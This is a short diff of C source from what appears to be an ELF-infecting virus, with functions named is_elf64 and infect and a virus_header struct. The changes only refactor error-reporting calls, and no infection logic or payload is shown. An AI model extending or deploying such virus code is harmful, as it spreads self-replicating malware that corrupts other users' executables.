@@ -20,7 +20,7 @@ static bool	is_elf64(const char *file)
 	Elf64_Ehdr	hdr;
 	int		fd = sys_open(file, O_RDONLY);
 
-	if (fd < 0) return errors(ERR_SYS, _ERR_S_OPEN_FAILED);
+	if (fd < 0) return errors(ERR_SYS, _ERR_S_OPEN, _ERR_T_IS_ELF64);
 
 	if (sys_read(fd, &hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)
 	|| is_not_elf(hdr.e_ident)
@@ -33,7 +33,7 @@ static bool	is_elf64(const char *file)
 	|| has_no_shoff(hdr.e_shoff))
 	{
 		sys_close(fd);
-		return errors(ERR_USAGE, _ERR_U_NOT_ELF);
+		return errors(ERR_USAGE, _ERR_U_NOT_ELF, _ERR_T_IS_ELF64);
 	}
 	sys_close(fd);
 	return true;
@@ -57,7 +57,7 @@ inline bool	infect(const struct virus_header *vhdr, const char *file)
 	{
 		free_accessor(&file_ref);
 		free_accessor(&clone_ref);
-		return errors(ERR_THROW, _ERR_T_INFECT);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_INFECT);
 	}
 	free_accessor(&file_ref);
 	free_accessor(&clone_ref);
